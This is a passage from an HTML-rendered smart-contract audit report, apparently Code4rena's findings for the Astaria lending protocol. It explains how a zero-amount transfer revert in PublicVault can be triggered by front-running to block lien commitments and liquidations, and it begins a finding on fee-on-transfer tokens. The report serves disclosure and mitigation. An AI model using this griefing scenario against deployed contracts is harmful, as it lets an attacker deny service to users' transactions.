class=\"mtk11\">_beforeCommitToLien</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slopeAddition</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">slopeAddition</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payout</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_requestLienAndIssuePayout</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_afterCommitToLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">slopeAddition</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>which calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"124\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_beforeCommitToLien</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>which calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"125\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_beforeCommitToLien</span><span class=\"mtk1\">(IAstariaRouter.Commitment </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VaultImplementation</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">VaultData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadStorageSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">transferWithdrawReserve</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">timeToEpochEnd</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">processEpoch</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>which calls transferWithdrawReserve() which revert in 0 amount transfer.</p>\n<p>Consider the case below:</p>\n<ol>\n<li>User A calls commitToLien transaction is pending in mempool.</li>\n<li>User B front-run User A’s transaction by calling  transferWithdrawReserve() and the PublicVault has no ERC20 token balance or User B just want to call  transferWithdrawReserve and not try to front-run user A, but the impact and result is the same.</li>\n<li>User B’s transaction executes first,</li>\n<li>User A first his transaction revert because the ERC20 token asset revert in 0 amount transfer in transferWithdrawReserve() call</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"126\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// prevent transfer of more assets then are available</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>This revertion not only impacts commitToLien, but also impacts <code>PublicVault.sol#updateVaultAfterLiquidation</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"127\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateVaultAfterLiquidation</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxAuctionWindow</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">AfterLiquidationParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyLienToken</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawProxyIfNearBoundary</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">VaultData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadStorageSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_accrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">_setSlope</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienSlope</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo48</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">transferWithdrawReserve</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lienEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getLienEpoch</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienEnd</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_decreaseEpochLienCount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lienEpoch</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToEnd</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">timeToEpochEnd</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienEpoch</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">timeToEnd</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">maxAuctionWindow</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">_deployWithdrawProxyIfNotDeployed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lienEpoch</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">withdrawProxyIfNearBoundary</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">epochData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">lienEpoch</span><span class=\"mtk1\">].</span><span class=\"mtk12\">withdrawProxy</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">WithdrawProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">withdrawProxyIfNearBoundary</span><span class=\"mtk1\">).</span><span class=\"mtk11\">handleNewLiquidation</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">newAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">maxAuctionWindow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Transaction can revert in above code when calling</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"128\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">transferWithdrawReserve</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lienEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getLienEpoch</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienEnd</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>If the address has no ERC20 token balance and the ERC20 token revert in 0 amount transfer after PublicVault#transferWithdrawReserve is called first.</p>\n<h3 id=\"recommended-mitigation-steps-48\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-48\" aria-label=\"recommended mitigation steps 48 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol just return and do nothing when <code>PublicVault#transferWithdrawReserve</code> is called if the address has no ERC20 token balance.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/54\">androolloyd (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-33-lack-of-support-for-fee-on-transfer-token\" style=\"position:relative;\"><a href=\"#m-33-lack-of-support-for-fee-on-transfer-token\" aria-label=\"m 33 lack of support for fee on transfer token permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/51\">[M-33] Lack of support for fee-on-transfer token</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/51\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/605\">joestakey</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/377\">kaden</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/360\">Bjorn_bug</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/346\">fs0c</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/312\">KIntern_NA</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/280\">obront</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/254\">Jujic</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/183\">unforgiven</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/120\">RaymondFam</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/TransferProxy.sol#L34\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/TransferProxy.sol#L34</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L181\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L181</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L643\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L643</a></p>\n<p>In the codebase, the usage of safeTransfer and safeTransferFrom assume that the receiver receives the exact transferred amount.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"129\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">AstariaRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">528</span><span class=\"mtk1\">      </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IAstariaVaultBase</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commitments</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">529</span><span class=\"mtk1\">:       .</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalBorrowed</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">530</span><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ClearingHouse</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">142</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">143</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">144</span><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">160</span><span class=\"mtk1\">      </span><span class=\"mtk11\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">161</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">162</span><span class=\"mtk1\">          </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">COLLATERAL_TOKEN</span><span class=\"mtk1\">().</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">PublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">383</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">384</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">withdrawBalance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">385</span><span class=\"mtk1\">        </span><span class=\"mtk11\">WithdrawProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">).</span><span class=\"mtk11\">increaseWithdrawReserveReceived</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">VaultImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">393</span><span class=\"mtk1\">      </span><span class=\"mtk12\">payout</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_handleProtocolFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">394</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payout</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">395</span><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">405</span><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">406</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feeTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">407</span><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">WithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span 